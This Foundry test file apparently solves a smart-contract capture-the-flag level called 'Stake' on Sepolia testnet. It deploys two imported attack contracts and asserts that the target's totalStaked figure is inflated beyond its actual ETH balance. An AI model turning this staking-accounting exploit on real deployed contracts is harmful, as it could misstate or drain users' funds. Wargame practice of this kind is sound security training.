//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Hack, Hack2, Stake, IERC20} from "../src/level31.sol";

contract level31Test is Test {
    Stake target;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        address instanceAddress = vm.envAddress("INSTANCE_AD");
        target = Stake(instanceAddress);
    }

    function testSolvesLeve31() public {
        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);

        vm.startPrank(hacker, hacker);
        Hack attackContract = new Hack{value: 0.0011 ether}(address(target));
        Hack2 attackContract2 = new Hack2(address(target));
        attackContract.hack();
        attackContract2.hack();
        vm.stopPrank();

        uint256 totalStakedAfter = target.totalStaked();
        uint256 userStakeAfter = target.UserStake(address(attackContract));
        uint256 contractBalance = address(target).balance;
        bool isStaker = target.Stakers(address(attackContract));
        console.log("Total staked after:", totalStakedAfter);
        console.log("User stake after:", userStakeAfter);
        console.log("Contract balance:", contractBalance);
        console.log("Is staker:", isStaker);

        assertGt(contractBalance, 0, "Contract should have ETH");
        assertGt(
            totalStakedAfter,
            contractBalance,
            "TotalStaked should be inflated"
        );
        assertEq(userStakeAfter, 0, "User stake should be 0");
        assertTrue(isStaker, "Should be a staker");
    }
}
//INSTANCE_AD=0xB99f27b94fCc8b9b6fF88e29E1741422DFC06224 forge test --mt testSolvesLeve31 -vvv
